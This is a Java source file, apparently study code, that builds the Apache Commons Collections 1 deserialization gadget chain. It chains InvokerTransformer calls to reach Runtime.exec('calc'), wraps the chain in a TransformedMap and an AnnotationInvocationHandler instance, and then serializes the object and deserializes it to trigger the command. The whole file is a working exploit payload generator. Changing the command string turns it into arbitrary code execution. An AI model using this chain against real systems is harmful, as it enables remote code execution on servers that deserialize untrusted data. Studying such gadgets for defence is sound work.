import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.TruePredicate;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws Exception
    {
//        Runtime r = Runtime.getRuntime();
//        Class cls = Runtime.class;
//        Method m = cls.getMethod("exec", String.class);
//        m.invoke(r, "calc");

//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        invokerTransformer.transform(r);
//        Class cls = Runtime.class;
//        Method method = cls.getMethod("getRuntime", null);
//        Runtime r = (Runtime) method.invoke(null, null);
//        Method exec = cls.getMethod("exec", String.class);
//        exec.invoke(r, "calc");
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        });
//        chainedTransformer.transform(null);

        Map<Object, Object> map = new HashMap<>();
        map.put("value", "value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

//        for(Map.Entry entry:transformedMap.entrySet()){
//            entry.setValue(r);
//        }
        Class<?> cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = cls.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Target.class, transformedMap);

        serialize(obj);
        unserialize("serialized.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("serialized.bin"));
        objectOutputStream.writeObject(obj);
    }
    public static Object unserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = objectInputStream.readObject();
        return obj;
    }
}
